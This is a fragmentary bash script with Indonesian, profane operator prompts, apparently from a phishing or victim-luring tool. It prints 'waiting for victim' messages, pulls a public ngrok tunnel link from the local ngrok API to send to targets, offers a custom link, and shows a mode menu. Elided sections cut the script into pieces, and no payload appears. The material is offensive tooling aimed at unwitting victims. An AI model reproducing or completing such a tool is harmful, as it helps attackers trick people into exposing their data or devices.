...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menunggu Korban BANGSAT!!,\e[0m\e[0;31m Tekan Ctrl + C untuk keluar.gan..\e[0m\n"
while [ true ]; do
...
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Link Sudah Siap COK :\e[0m\e[1;77m %s\n' $send_link
...
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Link Sudah Siap COK :\e[0m\e[1;77m %s\e[0m\n" $link
...
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilih ModeNYA NJING : \e[0m' option_server
...
printf "\e[1;93m [!] pilih yang bener bang*at!\e[0m\n"
sleep 1
clear
start1
fi
...
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Buat link Custom apa gak njing? [y/n] : \e[0m'
read choose_sub
